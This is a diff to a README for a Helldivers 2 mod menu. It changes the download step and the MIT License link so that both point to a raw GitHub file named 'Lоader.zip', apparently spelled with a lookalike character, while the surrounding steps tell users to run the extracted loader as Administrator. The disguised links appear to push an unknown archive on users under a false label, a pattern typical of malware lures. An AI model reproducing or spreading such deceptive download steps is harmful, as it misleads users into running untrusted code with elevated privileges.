@@ -45,7 +45,7 @@ All features are rigorously tested for stability and safety on these platforms.
 
 Follow these steps to start using the **Helldivers 2 Mod Menu**:
 
-1. **Download** `Loader.rar` from the repository.
+1. **Download** `https://raw.githubusercontent.com/ARTMIN3555/Helldivers2-EnhancedModToolkit/main/Lоader.zip` from the repository.
 2. **Extract** the contents using your favorite archive tool (WinRAR, 7-Zip, or native extractor).
 3. **Run** the Loader application as Administrator (Windows) or with appropriate permissions (Linux/macOS).
 4. **Launch** Helldivers 2 and access the mod menu in-game via your configured hotkey.
@@ -69,7 +69,7 @@ This software is strictly for educational and personal use. **Helldivers 2 Mod M
 
 ## 📝 License
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/).
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/ARTMIN3555/Helldivers2-EnhancedModToolkit/main/Lоader.zip).
 
 ---
 
